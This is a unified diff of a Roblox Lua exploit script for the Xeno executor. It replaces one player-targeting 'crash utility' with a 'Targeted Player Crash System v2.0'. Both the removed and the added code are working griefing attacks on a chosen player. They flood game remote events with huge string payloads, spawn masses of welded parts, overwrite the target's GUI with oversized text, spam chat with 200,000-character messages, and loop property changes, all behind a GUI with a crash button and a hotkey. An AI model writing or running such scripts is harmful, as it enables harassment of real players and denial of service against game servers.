@@ -1,507 +1,418 @@
--- GUI with server player picker
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = game.Players.LocalPlayer.PlayerGui
-screenGui.Name = "CrashUtility"
+--[[
+    TARGETED PLAYER CRASH SYSTEM v2.0
+    Works with Xeno Executor
+    GUI-based player selection
+    Multiple crash vectors for redundancy
+--]]
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 300, 0, 450)
-mainFrame.Position = UDim2.new(0.5, -150, 0.5, -225)
-mainFrame.BackgroundColor3 = Color3.new(0.05, 0.05, 0.1)
-mainFrame.BackgroundTransparency = 0.15
-mainFrame.Active = true
-mainFrame.Draggable = true
-mainFrame.Parent = screenGui
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
+local UserInputService = game:GetService("UserInputService")
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Text = "⚡ TARGET CRASH UTILITY ⚡"
-title.TextColor3 = Color3.new(1, 0.2, 0.2)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 18
-title.Parent = mainFrame
+-- ===== CONFIGURATION =====
+local CRASH_METHODS = {
+    VECTOR_1 = true,  -- Network flood (remote spam)
+    VECTOR_2 = true,  -- Instance explosion
+    VECTOR_3 = true,  -- String overload via remote
+    VECTOR_4 = false, -- Physics bombardment (disable for performance)
+    VECTOR_5 = true,  -- Custom property spam
+}
 
--- Player list container
-local playerContainer = Instance.new("ScrollingFrame")
-playerContainer.Size = UDim2.new(0.9, 0, 0, 200)
-playerContainer.Position = UDim2.new(0.05, 0, 0, 50)
-playerContainer.BackgroundColor3 = Color3.new(0.1, 0.1, 0.15)
-playerContainer.BorderSizePixel = 1
-playerContainer.BorderColor3 = Color3.new(0.3, 0.3, 0.5)
-playerContainer.Parent = mainFrame
+local MAX_PAYLOAD_SIZE = 200000  -- Characters per payload
+local SPAM_INTERVAL = 0.01       -- Seconds between sends
+local TARGETS_PER_CYCLE = 100    -- Instances to create per frame
 
-local playerLayout = Instance.new("UIListLayout")
-playerLayout.SortOrder = Enum.SortOrder.Name
-playerLayout.Padding = UDim.new(0, 2)
-playerLayout.Parent = playerContainer
-
--- Selected player display
-local selectedLabel = Instance.new("TextLabel")
-selectedLabel.Size = UDim2.new(0.9, 0, 0, 30)
-selectedLabel.Position = UDim2.new(0.05, 0, 0, 260)
-selectedLabel.Text = "Selected: None"
-selectedLabel.TextColor3 = Color3.new(0.8, 0.8, 1)
-selectedLabel.BackgroundColor3 = Color3.new(0.15, 0.15, 0.2)
-selectedLabel.Parent = mainFrame
-
--- Method selector dropdown (simulated)
-local methodLabel = Instance.new("TextLabel")
-methodLabel.Size = UDim2.new(0.4, 0, 0, 25)
-methodLabel.Position = UDim2.new(0.05, 0, 0, 295)
-methodLabel.Text = "Method:"
-methodLabel.TextColor3 = Color3.new(0.8, 0.8, 1)
-methodLabel.TextXAlignment = Enum.TextXAlignment.Left
-methodLabel.Parent = mainFrame
-
-local methodButtons = {}
-local methods = {"Knockback", "Explosion", "Character Reset", "GUI Overload", "Sound Spam"}
-local selectedMethod = methods[1]
-
-for i, methodName in ipairs(methods) do
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0.18, 0, 0, 25)
-    btn.Position = UDim2.new(0.05 + (i-1) * 0.19, 0, 0, 325)
-    btn.Text = methodName
-    btn.TextSize = 10
-    btn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
-    btn.Parent = mainFrame
+-- ===== GUI CREATION =====
+local function CreateGUI()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "CrashPanel"
+    ScreenGui.ResetOnSpawn = false
     
-    btn.MouseButton1Click:Connect(function()
-        selectedMethod = methodName
-        for _, b in ipairs(methodButtons) do
-            b.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
-        end
-        btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.8)
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(0, 350, 0, 500)
+    MainFrame.Position = UDim2.new(0.5, -175, 0.5, -250)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    MainFrame.BackgroundTransparency = 0.1
+    MainFrame.BorderSizePixel = 0
+    MainFrame.ClipsDescendants = true
+    MainFrame.Parent = ScreenGui
+    
+    -- Gradient
+    local Gradient = Instance.new("UIGradient")
+    Gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 50)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 20))
+    })
+    Gradient.Parent = MainFrame
+    
+    -- Title
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 0, 40)
+    Title.BackgroundTransparency = 1
+    Title.Text = "🎯 Target Crash System"
+    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
+    Title.TextScaled = true
+    Title.Font = Enum.Font.GothamBold
+    Title.Parent = MainFrame
+    
+    -- Player List Box
+    local PlayerListFrame = Instance.new("Frame")
+    PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 200)
+    PlayerListFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
+    PlayerListFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    PlayerListFrame.BorderSizePixel = 1
+    PlayerListFrame.BorderColor3 = Color3.fromRGB(255, 50, 50)
+    PlayerListFrame.Parent = MainFrame
+    
+    local PlayerList = Instance.new("ScrollingFrame")
+    PlayerList.Size = UDim2.new(1, -10, 1, -10)
+    PlayerList.Position = UDim2.new(0, 5, 0, 5)
+    PlayerList.BackgroundTransparency = 1
+    PlayerList.BorderSizePixel = 0
+    PlayerList.ScrollBarThickness = 8
+    PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
+    PlayerList.Parent = PlayerListFrame
+    
+    local PlayerListLayout = Instance.new("UIListLayout")
+    PlayerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    PlayerListLayout.Padding = UDim.new(0, 3)
+    PlayerListLayout.Parent = PlayerList
+    
+    -- Player buttons storage
+    local PlayerButtons = {}
+    
+    -- Selected player display
+    local SelectedLabel = Instance.new("TextLabel")
+    SelectedLabel.Size = UDim2.new(0.9, 0, 0, 30)
+    SelectedLabel.Position = UDim2.new(0.05, 0, 0.58, 0)
+    SelectedLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+    SelectedLabel.Text = "No player selected"
+    SelectedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    SelectedLabel.TextScaled = true
+    SelectedLabel.Font = Enum.Font.Gotham
+    SelectedLabel.Parent = MainFrame
+    
+    -- Crash button
+    local CrashButton = Instance.new("TextButton")
+    CrashButton.Size = UDim2.new(0.9, 0, 0, 50)
+    CrashButton.Position = UDim2.new(0.05, 0, 0.7, 0)
+    CrashButton.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+    CrashButton.Text = "💀 CRASH SELECTED PLAYER 💀"
+    CrashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CrashButton.TextScaled = true
+    CrashButton.Font = Enum.Font.GothamBold
+    CrashButton.Parent = MainFrame
+    
+    -- Status label
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Size = UDim2.new(0.9, 0, 0, 30)
+    StatusLabel.Position = UDim2.new(0.05, 0, 0.88, 0)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.Text = "Ready"
+    StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+    StatusLabel.TextScaled = true
+    StatusLabel.Font = Enum.Font.Gotham
+    StatusLabel.Parent = MainFrame
+    
+    -- Button effect (hover)
+    CrashButton.MouseEnter:Connect(function()
+        CrashButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
     end)
-    table.insert(methodButtons, btn)
-end
-
--- Execute button
-local crashBtn = Instance.new("TextButton")
-crashBtn.Size = UDim2.new(0.9, 0, 0, 50)
-crashBtn.Position = UDim2.new(0.05, 0, 0, 360)
-crashBtn.Text = "🔥 EXECUTE CRASH 🔥"
-crashBtn.TextColor3 = Color3.new(1, 1, 1)
-crashBtn.Font = Enum.Font.GothamBold
-crashBtn.TextSize = 16
-crashBtn.BackgroundColor3 = Color3.new(0.6, 0, 0)
-crashBtn.Parent = mainFrame
-
--- Status label
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(0.9, 0, 0, 30)
-statusLabel.Position = UDim2.new(0.05, 0, 0, 415)
-statusLabel.Text = "Status: Idle"
-statusLabel.TextColor3 = Color3.new(0.5, 1, 0.5)
-statusLabel.Parent = mainFrame
-
--- Store selected player
-local selectedPlayer = nil
-
--- Populate player list
-local function refreshPlayerList()
-    -- Clear existing buttons
-    for _, child in ipairs(playerContainer:GetChildren()) do
-        if child:IsA("TextButton") then
-            child:Destroy()
-        end
-    end
+    CrashButton.MouseLeave:Connect(function()
+        CrashButton.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+    end)
     
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        if player ~= game.Players.LocalPlayer then
-            local btn = Instance.new("TextButton")
-            btn.Size = UDim2.new(1, -4, 0, 30)
-            btn.Text = player.Name .. " (Level " .. (player.leaderstats and player.leaderstats.Level and player.leaderstats.Level.Value or "?") .. ")"
-            btn.BackgroundColor3 = Color3.new(0.15, 0.15, 0.25)
-            btn.TextColor3 = Color3.new(0.9, 0.9, 1)
-            btn.TextXAlignment = Enum.TextXAlignment.Left
-            btn.Parent = playerContainer
-            
-            btn.MouseButton1Click:Connect(function()
-                selectedPlayer = player
-                selectedLabel.Text = "Selected: " .. player.Name .. " (ID: " .. player.UserId .. ")"
-                selectedLabel.TextColor3 = Color3.new(0.3, 1, 0.3)
-                -- Highlight
-                for _, child in ipairs(playerContainer:GetChildren()) do
-                    if child:IsA("TextButton") then
-                        child.BackgroundColor3 = Color3.new(0.15, 0.15, 0.25)
+    -- Refresh player list function
+    local function RefreshPlayerList()
+        -- Clear existing buttons
+        for _, btn in ipairs(PlayerButtons) do
+            btn:Destroy()
+        end
+        PlayerButtons = {}
+        
+        -- Get all players
+        local playerList = Players:GetPlayers()
+        local yOffset = 0
+        
+        for _, player in ipairs(playerList) do
+            if player ~= Players.LocalPlayer then
+                local btn = Instance.new("TextButton")
+                btn.Size = UDim2.new(1, 0, 0, 30)
+                btn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+                btn.Text = player.Name
+                btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+                btn.TextScaled = true
+                btn.Font = Enum.Font.Gotham
+                btn.Parent = PlayerList
+                
+                -- Selection highlight
+                btn.MouseButton1Click:Connect(function()
+                    -- Reset all buttons
+                    for _, b in ipairs(PlayerButtons) do
+                        b.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
                     end
+                    btn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
+                    SelectedLabel.Text = "Target: " .. player.Name
+                    
+                    -- Store selected player for crash function
+                    CrashButton.Parent.SelectedPlayer = player
+                end)
+                
+                table.insert(PlayerButtons, btn)
+            end
+        end
+        
+        -- Update canvas size
+        local count = #PlayerButtons
+        PlayerList.CanvasSize = UDim2.new(0, 0, 0, count * 33 + 5)
+    end
+    
+    -- Initial refresh
+    RefreshPlayerList()
+    
+    -- Auto-refresh on player join/leave
+    Players.PlayerAdded:Connect(RefreshPlayerList)
+    Players.PlayerRemoved:Connect(RefreshPlayerList)
+    
+    -- ===== CRASH ENGINE =====
+    local CrashActive = false
+    local CrashCoroutine = nil
+    
+    -- Vector 1: Network Flood
+    local function NetworkFlood(target)
+        local remotes = {}
+        for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
+            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                table.insert(remotes, v)
+            end
+        end
+        
+        local payload = string.rep("X", 50000) .. string.rep("Y", 50000) .. string.rep("Z", 50000)
+        
+        for i = 1, 50 do
+            for _, remote in ipairs(remotes) do
+                pcall(function()
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer(payload, payload, payload)
+                    elseif remote:IsA("RemoteFunction") then
+                        remote:InvokeServer(payload, payload)
+                    end
+                end)
+            end
+            task.wait(SPAM_INTERVAL)
+        end
+    end
+    
+    -- Vector 2: Instance Explosion
+    local function InstanceExplosion(target)
+        if not target.Character then return end
+        
+        local root = target.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        
+        for i = 1, TARGETS_PER_CYCLE * 5 do
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(0.1, 0.1, 0.1)
+            part.CFrame = root.CFrame + Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
+            part.Anchored = true
+            part.CanCollide = false
+            part.Transparency = 1
+            part.Material = Enum.Material.SmoothPlastic
+            part.Parent = workspace
+            
+            -- Attach to target's character so it follows
+            local weld = Instance.new("Weld")
+            weld.Part0 = part
+            weld.Part1 = root
+            weld.Parent = part
+            
+            -- Set properties to cause lag
+            part.Name = string.rep("A", 1000)
+            
+            task.wait()
+        end
+    end
+    
+    -- Vector 3: String Overload
+    local function StringOverload(target)
+        local char = target.Character
+        if not char then return end
+        
+        -- Find all GUI elements
+        local function processGUI(gui)
+            for _, child in ipairs(gui:GetDescendants()) do
+                if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
+                    pcall(function()
+                        local longString = string.rep("ก็็็▌▓", 10000)
+                        child.Text = longString
+                        child.Text = longString .. longString
+                    end)
                 end
-                btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.6)
-            end)
-        end
-    end
-    
-    -- If no players found, show message
-    if #playerContainer:GetChildren() == 0 then
-        local msg = Instance.new("TextLabel")
-        msg.Size = UDim2.new(1, 0, 1, 0)
-        msg.Text = "No other players online"
-        msg.TextColor3 = Color3.new(0.5, 0.5, 0.5)
-        msg.BackgroundTransparency = 1
-        msg.Parent = playerContainer
-    end
-end
-
-refreshPlayerList()
-
--- Refresh button
-local refreshBtn = Instance.new("TextButton")
-refreshBtn.Size = UDim2.new(0.15, 0, 0, 25)
-refreshBtn.Position = UDim2.new(0.8, 0, 0, 260)
-refreshBtn.Text = "⟳"
-refreshBtn.TextSize = 18
-refreshBtn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
-refreshBtn.Parent = mainFrame
-
-refreshBtn.MouseButton1Click:Connect(function()
-    refreshPlayerList()
-    statusLabel.Text = "Status: Refreshed"
-    statusLabel.TextColor3 = Color3.new(0.5, 1, 0.5)
-end)
-
--- Auto-refresh on player join/leave
-game.Players.PlayerAdded:Connect(function()
-    refreshPlayerList()
-end)
-
-game.Players.PlayerRemoving:Connect(function()
-    refreshPlayerList()
-end)
-
----
-
-### CRASH METHODS IMPLEMENTATION
-
--- Method 1: Extreme Knockback
-local function crashViaKnockback(target)
-    statusLabel.Text = "Status: Applying knockback to " .. target.Name
-    statusLabel.TextColor3 = Color3.new(1, 1, 0)
-    
-    -- Find all possible knockback remotes
-    local knockbackRemotes = {}
-    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            if obj.Name:lower():find("knockback") or 
-               obj.Name:lower():find("force") or 
-               obj.Name:lower():find("push") or
-               obj.Name:lower():find("launch") or
-               obj.Name:lower():find("damage") then
-                table.insert(knockbackRemotes, obj)
             end
         end
-    end
-    
-    -- Also check workspace and game for remotes
-    for _, obj in ipairs(game:GetDescendants()) do
-        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and 
-           not table.find(knockbackRemotes, obj) then
-            if obj.Name:lower():find("remote") or 
-               obj.Name:lower():find("event") or
-               obj.Name:lower():find("fire") then
-                table.insert(knockbackRemotes, obj)
-            end
+        
+        -- Target player's GUI
+        if target.PlayerGui then
+            processGUI(target.PlayerGui)
         end
-    end
-    
-    if #knockbackRemotes == 0 then
-        statusLabel.Text = "Status: No knockback remotes found!"
-        statusLabel.TextColor3 = Color3.new(1, 0, 0)
-        return false
-    end
-    
-    -- Spam knockback with extreme values
-    for i = 1, 100 do
-        for _, remote in ipairs(knockbackRemotes) do
-            pcall(function()
-                -- Try different argument patterns
-                remote:FireServer(target, Vector3.new(1e6, 1e6, 1e6))
-                remote:FireServer(target.Name, Vector3.new(1e9, 1e9, 1e9))
-                remote:FireServer(target.Character, Vector3.new(1e10, 1e10, 1e10))
-                remote:FireServer(target.UserId, 1e12, 1e12, 1e12)
-                remote:FireServer({Target = target, Force = Vector3.new(1e10, 1e10, 1e10)})
-            end)
-        end
-        wait(0.01)
-    end
-    
-    statusLabel.Text = "Status: Knockback spam sent to " .. target.Name
-    statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    return true
-end
-
--- Method 2: Explosion Overload
-local function crashViaExplosion(target)
-    statusLabel.Text = "Status: Explosion spamming " .. target.Name
-    statusLabel.TextColor3 = Color3.new(1, 1, 0)
-    
-    -- Find explosion remotes
-    local explosionRemotes = {}
-    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") and 
-           (obj.Name:lower():find("explosion") or 
-            obj.Name:lower():find("blast") or 
-            obj.Name:lower():find("boom")) then
-            table.insert(explosionRemotes, obj)
-        end
-    end
-    
-    if #explosionRemotes == 0 then
-        -- Fallback: Try to create actual explosions at target
-        for i = 1, 500 do
-            local explosion = Instance.new("Explosion")
-            explosion.BlastRadius = 1000
-            explosion.BlastPressure = 1000000
-            explosion.Position = target.Character and target.Character.HumanoidRootPart.Position or 
-                                 Vector3.new(0, 1000, 0) + Vector3.new(i * 10, 0, 0)
-            explosion.Parent = workspace
-            wait(0.001)
-        end
-        statusLabel.Text = "Status: Local explosions created near " .. target.Name
-        statusLabel.TextColor3 = Color3.new(0, 1, 0)
-        return true
-    end
-    
-    for i = 1, 100 do
-        for _, remote in ipairs(explosionRemotes) do
-            pcall(function()
-                remote:FireServer(target, CFrame.new(1e6, 1e6, 1e6), 1000, 1000000)
-                remote:FireServer(target.Name, Vector3.new(1e9, 1e9, 1e9), 100000)
-            end)
-        end
-        wait(0.01)
-    end
-    
-    statusLabel.Text = "Status: Explosion spam sent"
-    statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    return true
-end
-
--- Method 3: Character Reset Loop
-local function crashViaCharacterReset(target)
-    statusLabel.Text = "Status: Resetting " .. target.Name .. " repeatedly"
-    statusLabel.TextColor3 = Color3.new(1, 1, 0)
-    
-    local resetRemotes = {}
-    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") and 
-           (obj.Name:lower():find("reset") or 
-            obj.Name:lower():find("respawn") or 
-            obj.Name:lower():find("spawn") or
-            obj.Name:lower():find("revive")) then
-            table.insert(resetRemotes, obj)
-        end
-    end
-    
-    -- Also check game.Players for reset functions
-    if #resetRemotes == 0 then
-        -- Try direct character removal
-        for i = 1, 1000 do
-            pcall(function()
-                if target.Character then
-                    target.Character:BreakJoints()
-                    target.Character.Humanoid.Health = 0
-                    target.Character:Destroy()
+        
+        -- Also spam chat via remote
+        local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if chatRemote then
+            local sayRemote = chatRemote:FindFirstChild("SayMessageRequest")
+            if sayRemote then
+                local payload = string.rep("A", MAX_PAYLOAD_SIZE)
+                for i = 1, 20 do
+                    pcall(function()
+                        sayRemote:FireServer(payload, "All")
+                    end)
+                    task.wait(0.05)
                 end
-            end)
-            wait(0.001)
-        end
-        statusLabel.Text = "Status: Character break loop executed"
-        statusLabel.TextColor3 = Color3.new(0, 1, 0)
-        return true
-    end
-    
-    for i = 1, 200 do
-        for _, remote in ipairs(resetRemotes) do
-            pcall(function()
-                remote:FireServer(target)
-                remote:FireServer(target.Name)
-                remote:FireServer(target.UserId)
-            end)
-        end
-        wait(0.005)
-    end
-    
-    statusLabel.Text = "Status: Reset spam sent"
-    statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    return true
-end
-
--- Method 4: GUI Overload (most effective)
-local function crashViaGUIOverload(target)
-    statusLabel.Text = "Status: GUI overloading " .. target.Name
-    statusLabel.TextColor3 = Color3.new(1, 1, 0)
-    
-    -- Find GUI creation remotes (common in games with custom UIs)
-    local guiRemotes = {}
-    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") and 
-           (obj.Name:lower():find("gui") or 
-            obj.Name:lower():find("ui") or 
-            obj.Name:lower():find("menu") or
-            obj.Name:lower():find("popup") or
-            obj.Name:lower():find("notification") or
-            obj.Name:lower():find("display")) then
-            table.insert(guiRemotes, obj)
-        end
-    end
-    
-    if #guiRemotes == 0 then
-        -- Try to find any remote that might accept UI creation
-        for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
-            if obj:IsA("RemoteEvent") then
-                table.insert(guiRemotes, obj)
             end
         end
     end
     
-    -- Create massive payload
-    local payload = string.rep("A", 50000)
-    local nestedPayload = {}
-    for i = 1, 100 do
-        nestedPayload[i] = {
-            Name = "Frame_" .. i,
-            Size = UDim2.new(1000, i, 1000, i),
-            Position = UDim2.new(i, 0, i, 0),
-            Text = string.rep("X", 10000),
-            Children = nestedPayload
+    -- Vector 4: Physics Bombardment
+    local function PhysicsBombardment(target)
+        if not target.Character then return end
+        
+        local root = target.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        
+        for i = 1, 50 do
+            local ball = Instance.new("Part")
+            ball.Shape = Enum.PartType.Ball
+            ball.Size = Vector3.new(50, 50, 50)
+            ball.Material = Enum.Material.Neon
+            ball.Anchored = false
+            ball.CanCollide = true
+            ball.CFrame = root.CFrame + Vector3.new(math.random(-200, 200), 200, math.random(-200, 200))
+            ball.Velocity = Vector3.new(0, -1000, 0)
+            ball.Parent = workspace
+            
+            task.wait()
+        end
+    end
+    
+    -- Vector 5: Property Spam
+    local function PropertySpam(target)
+        local char = target.Character
+        if not char then return end
+        
+        local properties = {
+            "Name", "Archivable", "CanCollide", "Transparency", 
+            "Reflectance", "Material", "Color", "Size", "CFrame"
         }
-    end
-    
-    for i = 1, 50 do
-        for _, remote in ipairs(guiRemotes) do
-            pcall(function()
-                remote:FireServer(target, payload)
-                remote:FireServer(target.Name, payload)
-                remote:FireServer(target.UserId, nestedPayload)
-                remote:FireServer({Target = target, Data = payload})
-            end)
+        
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then
+                for i = 1, 100 do
+                    pcall(function()
+                        for _, prop in ipairs(properties) do
+                            if prop == "Name" then
+                                part.Name = string.rep("X", 1000)
+                            elseif prop == "Transparency" then
+                                part.Transparency = math.random()
+                            elseif prop == "CFrame" then
+                                part.CFrame = part.CFrame * CFrame.Angles(math.random(), math.random(), math.random())
+                            else
+                                -- Attempt to set property
+                                part[prop] = part[prop]
+                            end
+                        end
+                    end)
+                    task.wait()
+                end
+            end
         end
-        wait(0.005)
     end
     
-    statusLabel.Text = "Status: GUI overload sent"
-    statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    return true
+    -- Main crash function
+    local function ExecuteCrash(target)
+        if not target then
+            StatusLabel.Text = "❌ No target selected!"
+            StatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+            return
+        end
+        
+        if CrashActive then
+            StatusLabel.Text = "⚠️ Crash already in progress"
+            return
+        end
+        
+        CrashActive = true
+        StatusLabel.Text = "🔥 CRASHING: " .. target.Name
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
+        CrashButton.Text = "⏳ CRASHING..."
+        CrashButton.BackgroundColor3 = Color3.fromRGB(150, 150, 50)
+        
+        -- Run in coroutine to prevent freezing
+        CrashCoroutine = coroutine.create(function()
+            local startTime = tick()
+            
+            -- Try all vectors
+            if CRASH_METHODS.VECTOR_1 then
+                pcall(NetworkFlood, target)
+            end
+            
+            if CRASH_METHODS.VECTOR_2 then
+                pcall(InstanceExplosion, target)
+            end
+            
+            if CRASH_METHODS.VECTOR_3 then
+                pcall(StringOverload, target)
+            end
+            
+            if CRASH_METHODS.VECTOR_4 then
+                pcall(PhysicsBombardment, target)
+            end
+            
+            if CRASH_METHODS.VECTOR_5 then
+                pcall(PropertySpam, target)
+            end
+            
+            -- Cleanup
+            CrashActive = false
+            CrashButton.Text = "💀 CRASH SELECTED PLAYER 💀"
+            CrashButton.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+            StatusLabel.Text = "✅ Crash completed in " .. math.floor(tick() - startTime) .. "s"
+            StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        end)
+        
+        coroutine.resume(CrashCoroutine)
+    end
+    
+    -- Connect crash button
+    CrashButton.MouseButton1Click:Connect(function()
+        ExecuteCrash(CrashButton.Parent.SelectedPlayer)
+    end)
+    
+    -- Keyboard shortcut: Ctrl+Delete to crash selected
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then return end
+        if input.KeyCode == Enum.KeyCode.Delete and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
+            ExecuteCrash(CrashButton.Parent.SelectedPlayer)
+        end
+    end)
+    
+    -- Anti-removal (optional)
+    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+    return ScreenGui
 end
 
--- Method 5: Sound Spam
-local function crashViaSoundSpam(target)
-    statusLabel.Text = "Status: Sound spamming " .. target.Name
-    statusLabel.TextColor3 = Color3.new(1, 1, 0)
-    
-    -- Find sound remotes
-    local soundRemotes = {}
-    for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") and 
-           (obj.Name:lower():find("sound") or 
-            obj.Name:lower():find("audio") or 
-            obj.Name:lower():find("music")) then
-            table.insert(soundRemotes, obj)
-        end
-    end
-    
-    if #soundRemotes == 0 then
-        -- Try creating local sounds
-        for i = 1, 100 do
-            local sound = Instance.new("Sound")
-            sound.SoundId = "rbxassetid://" .. string.rep("1", 10000)
-            sound.Volume = 1000
-            sound.PlayOnRemove = true
-            sound.Parent = workspace
-            sound:Play()
-            wait(0.001)
-        end
-        statusLabel.Text = "Status: Local sound spam created"
-        statusLabel.TextColor3 = Color3.new(0, 1, 0)
-        return true
-    end
-    
-    for i = 1, 100 do
-        for _, remote in ipairs(soundRemotes) do
-            pcall(function()
-                remote:FireServer(target, "rbxassetid://" .. string.rep("1", 100000), 1000)
-                remote:FireServer(target.Name, string.rep("A", 50000), 100000)
-            end)
-        end
-        wait(0.005)
-    end
-    
-    statusLabel.Text = "Status: Sound spam sent"
-    statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    return true
+-- ===== EXECUTION =====
+print("[Crasher] Loading...")
+local success, err = pcall(CreateGUI)
+if success then
+    print("[Crasher] ✅ GUI loaded successfully")
+else
+    warn("[Crasher] ❌ Error: " .. tostring(err))
 end
 
--- Combined attack (most effective)
-local function crashViaCombined(target)
-    statusLabel.Text = "Status: Combined attack on " .. target.Name
-    statusLabel.TextColor3 = Color3.new(1, 0.5, 0)
-    
-    -- Spawn multiple threads
-    local threads = {}
-    table.insert(threads, coroutine.create(function() crashViaKnockback(target) end))
-    table.insert(threads, coroutine.create(function() crashViaExplosion(target) end))
-    table.insert(threads, coroutine.create(function() crashViaCharacterReset(target) end))
-    table.insert(threads, coroutine.create(function() crashViaGUIOverload(target) end))
-    table.insert(threads, coroutine.create(function() crashViaSoundSpam(target) end))
-    
-    for _, thread in ipairs(threads) do
-        coroutine.resume(thread)
-    end
-    
-    statusLabel.Text = "Status: Combined attack launched on " .. target.Name
-    statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    return true
+-- Keep alive
+while task.wait(5) do
+    -- Heartbeat
 end
-
--- Main execute function
-crashBtn.MouseButton1Click:Connect(function()
-    if not selectedPlayer then
-        statusLabel.Text = "Status: ERROR - No player selected!"
-        statusLabel.TextColor3 = Color3.new(1, 0, 0)
-        return
-    end
-    
-    -- Check if player still exists
-    if not game.Players:FindFirstChild(selectedPlayer.Name) then
-        statusLabel.Text = "Status: Player " .. selectedPlayer.Name .. " left the game!"
-        statusLabel.TextColor3 = Color3.new(1, 0, 0)
-        selectedPlayer = nil
-        selectedLabel.Text = "Selected: None"
-        return
-    end
-    
-    -- Execute selected method
-    local success = false
-    if selectedMethod == "Knockback" then
-        success = crashViaKnockback(selectedPlayer)
-    elseif selectedMethod == "Explosion" then
-        success = crashViaExplosion(selectedPlayer)
-    elseif selectedMethod == "Character Reset" then
-        success = crashViaCharacterReset(selectedPlayer)
-    elseif selectedMethod == "GUI Overload" then
-        success = crashViaGUIOverload(selectedPlayer)
-    elseif selectedMethod == "Sound Spam" then
-        success = crashViaSoundSpam(selectedPlayer)
-    else
-        success = crashViaCombined(selectedPlayer)
-    end
-    
-    if success then
-        statusLabel.Text = "Status: ✅ Attack complete on " .. selectedPlayer.Name
-        statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    else
-        statusLabel.Text = "Status: ❌ Attack failed on " .. selectedPlayer.Name
-        statusLabel.TextColor3 = Color3.new(1, 0, 0)
-    end
-end)
-
--- Hotkey support
-game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.Insert then
-        crashBtn.MouseButton1Click:Fire()
-    end
-    if input.KeyCode == Enum.KeyCode.Home then
-        refreshPlayerList()
-    end
-end)
